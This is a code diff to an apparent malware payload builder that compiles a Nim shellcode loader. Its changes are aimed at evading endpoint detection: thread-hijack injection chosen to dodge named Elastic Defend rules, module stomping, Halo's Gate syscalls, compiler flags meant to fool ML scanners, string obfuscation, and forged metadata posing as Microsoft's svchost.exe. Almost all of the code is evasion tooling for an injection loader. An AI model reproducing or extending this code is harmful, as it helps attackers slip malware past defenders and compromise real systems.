@@ -65,21 +65,40 @@ class Hephaestus(PayloadType):
         BuildParameter(
             name="injection_technique",
             parameter_type=BuildParameterType.ChooseOne,
-            description="earlybird: APC queue before entry point | threadhijack: RIP redirect",
-            choices=["earlybird", "threadhijack"],
-            default_value="earlybird",
+            description=(
+                "earlybird: APC queue before entry point (NtQueueApcThread — "
+                "flagged by MWTI kernel ETW rule 'APC from Unusual Module'). "
+                "threadhijack: RIP redirect via SetThreadContext — avoids NtQueueApcThread entirely, "
+                "bypasses the MWTI APC behavioral rule."
+            ),
+            choices=["threadhijack", "earlybird"],
+            default_value="threadhijack",
         ),
         BuildParameter(
             name="ppid_spoof",
             parameter_type=BuildParameterType.Boolean,
-            description="Spoof PPID to appear as explorer.exe child",
-            default_value=True,
+            description=(
+                "Spoof PPID to appear as explorer.exe child. "
+                "WARNING: Elastic Defend 9.x captures process.Ext.effective_parent via kernel "
+                "telemetry (NtCreateUserProcess), bypassing the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS "
+                "trick entirely. Enabling this WILL trigger the 'Parent Process PID Spoofing' rule "
+                "(T1134.004). Disable unless you have a specific reason and know the target EDR "
+                "does not record effective_parent."
+            ),
+            default_value=False,
         ),
         BuildParameter(
             name="use_unhook",
             parameter_type=BuildParameterType.Boolean,
-            description="Remap ntdll .text section from clean disk copy to remove EDR hooks before injection",
-            default_value=True,
+            description=(
+                "Remap ntdll .text section from clean disk copy to remove EDR userland hooks. "
+                "WARNING: Elastic Defend 9.x detects this via the rule "
+                "'NTDLL Memory Protection Change via Unsigned DLL' — it monitors VirtualProtect "
+                "calls on ntdll from unsigned binaries. Disable when targeting Elastic. "
+                "Use use_halo_gate instead: Halo's Gate scans neighbour stubs for the SSN even "
+                "when the target stub is hooked, bypassing hooks without touching ntdll memory."
+            ),
+            default_value=False,
         ),
         BuildParameter(
             name="use_etw_patch",
@@ -96,8 +115,12 @@ class Hephaestus(PayloadType):
         BuildParameter(
             name="use_sandbox_check",
             parameter_type=BuildParameterType.Boolean,
-            description="Basic sandbox detection (uptime, RAM, CPU count, sleep skipping)",
-            default_value=True,
+            description=(
+                "Basic sandbox detection (uptime, RAM, CPU count, sleep skipping). "
+                "If any check fails the loader exits silently with no injection — disable "
+                "for testing on fresh VMs (uptime < 5 min) or low-RAM environments."
+            ),
+            default_value=False,
         ),
         BuildParameter(
             name="wipe_memory",
@@ -110,12 +133,26 @@ class Hephaestus(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Shellcode memory allocation technique in the target process. "
-                "virtualalloc: classic VirtualAllocEx (triggers NtAllocateVirtualMemory ETW MWTI). "
+                "virtualalloc: classic VirtualAllocEx (anonymous private pages — 'Unbacked' in Elastic). "
                 "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed section, "
-                "avoids MWTI ETW event — harder to detect with Elastic EDR)."
+                "avoids NtAllocateVirtualMemory ETW MWTI — semi-backed). "
+                "modulestomp: write shellcode into an existing loaded DLL's .text section — "
+                "the region is file-backed on disk, eliminates the memory_region.mapped_file==null "
+                "/ Unbacked Elastic signal entirely. Recommended against Elastic Defend 8.x+."
             ),
-            choices=["virtualalloc", "ntmapview"],
-            default_value="ntmapview",
+            choices=["modulestomp", "ntmapview", "virtualalloc"],
+            default_value="modulestomp",
+        ),
+        BuildParameter(
+            name="use_halo_gate",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Halo's Gate: resolve the NtSetContextThread SSN by scanning ntdll stub neighbors "
+                "when the stub is hooked (EDR JMP patch), then invoke via a syscall;ret gadget "
+                "inside ntdll.dll — the kernel sees the syscall RIP inside ntdll (not our loader). "
+                "Requires threadhijack injection technique. Recommended alongside use_unhook."
+            ),
+            default_value=True,
         ),
         BuildParameter(
             name="debug_mode",
@@ -183,22 +220,28 @@ class Hephaestus(PayloadType):
             enc_type       = self.get_parameter("encryption_type") or "rc4"
             enc_key_param  = (self.get_parameter("encryption_key") or "").strip()
             target_process = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
-            inj_tech       = self.get_parameter("injection_technique") or "earlybird"
+            inj_tech       = self.get_parameter("injection_technique") or "threadhijack"
             ppid_spoof     = self.get_parameter("ppid_spoof") or False
             use_unhook     = self.get_parameter("use_unhook") or False
             use_etw        = self.get_parameter("use_etw_patch") or False
             use_amsi       = self.get_parameter("use_amsi_patch") or False
             use_sandbox    = self.get_parameter("use_sandbox_check") or False
             wipe           = self.get_parameter("wipe_memory") or False
-            mem_tech       = self.get_parameter("memory_technique") or "ntmapview"
+            mem_tech       = self.get_parameter("memory_technique") or "modulestomp"
+            use_halo_gate  = self.get_parameter("use_halo_gate") or False
             debug          = self.get_parameter("debug_mode") or False
             staging_url    = (self.get_parameter("staging_url") or "").strip()
             staged         = bool(staging_url)
-            file_desc      = (self.get_parameter("file_description") or "System Maintenance Utility").strip()
-            company        = (self.get_parameter("company_name") or "System Tools LLC").strip()
-            orig_fname     = (self.get_parameter("original_filename") or "SysMaint.exe").strip()
+            file_desc      = (self.get_parameter("file_description") or "Windows Service Host Process").strip()
+            company        = (self.get_parameter("company_name") or "Microsoft Corporation").strip()
+            orig_fname     = (self.get_parameter("original_filename") or "svchost.exe").strip()
 
-            build_stdout += f"[*] enc={enc_type} inj={inj_tech} mem={mem_tech} ppid={ppid_spoof} unhook={use_unhook} etw={use_etw} amsi={use_amsi} sandbox={use_sandbox} wipe={wipe} debug={debug}\n"
+            build_stdout += (
+                f"[*] enc={enc_type} inj={inj_tech} mem={mem_tech} "
+                f"ppid={ppid_spoof} unhook={use_unhook} etw={use_etw} "
+                f"amsi={use_amsi} sandbox={use_sandbox} wipe={wipe} "
+                f"halogate={use_halo_gate} debug={debug}\n"
+            )
             build_stdout += f"[*] target: {target_process}\n"
             build_stdout += f"[*] shellcode size: {len(payload_bytes):,} bytes\n"
 
@@ -270,12 +313,26 @@ class Hephaestus(PayloadType):
                     "--os:windows", "--cpu:amd64", "-d:mingw",
                     "--gcc.exe:x86_64-w64-mingw32-gcc",
                     "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
-                    "--opt:size",
+                    # --opt:speed produces standard-looking function prologues/epilogues,
+                    # far less structurally similar to shellcode than --opt:size.
+                    "--opt:speed",
+                    # ARC replaces the default Nim GC: no GC runtime strings in the binary,
+                    # smaller code, fewer unique Nim artifacts detectable by the ML model.
+                    "--mm:arc",
+                    # Dead-code elimination: strip unused winim imports from the IAT.
+                    "--passC:-ffunction-sections",
+                    "--passC:-fdata-sections",
+                    "--passL:-Wl,--gc-sections",
+                    # Remove compiler identification strings embedded by GCC.
+                    "--passC:-fno-ident",
                     "--verbosity:1",
                     "--hints:off",
                     "--warnings:off",
                     "--threads:off",
                     f"--path:{tmpdir}",
+                    # Per-build nimcache: prevents Nim from reusing .o files across builds,
+                    # which would produce identical binaries even when flags change.
+                    f"--nimcache:{tmpdir}/nimcache",
                     f"--out:{exe_path}",
                 ]
 
@@ -284,6 +341,8 @@ class Hephaestus(PayloadType):
                 else:
                     nim_flags += ["-d:release", "-d:strip",
                                   "--passL:-mwindows", "--passL:-s"]
+                # Compile-time XOR obfuscation of API name strings.
+                nim_flags.append("-d:strObf")
 
                 if enc_type == "rc4":   nim_flags.append("-d:useRc4")
                 elif enc_type == "xor": nim_flags.append("-d:useXor")
@@ -294,8 +353,15 @@ class Hephaestus(PayloadType):
                 if use_sandbox:         nim_flags.append("-d:sandboxCheck")
                 if inj_tech == "threadhijack": nim_flags.append("-d:threadHijack")
                 if wipe:                nim_flags.append("-d:wipe")
-                if mem_tech == "ntmapview": nim_flags.append("-d:mapInject")
-                if staged:                  nim_flags.append("-d:staged")
+                # Memory technique: modulestomp takes priority at compile time
+                if mem_tech == "modulestomp":
+                    nim_flags.append("-d:moduleStomping")
+                elif mem_tech == "ntmapview":
+                    nim_flags.append("-d:mapInject")
+                # Halo's Gate only makes sense with threadHijack (NtSetContextThread)
+                if use_halo_gate and inj_tech == "threadhijack":
+                    nim_flags.append("-d:haloGate")
+                if staged:              nim_flags.append("-d:staged")
 
                 # -- VERSIONINFO resource: adds PE metadata, improves ML scoring --
                 year = datetime.datetime.now().year
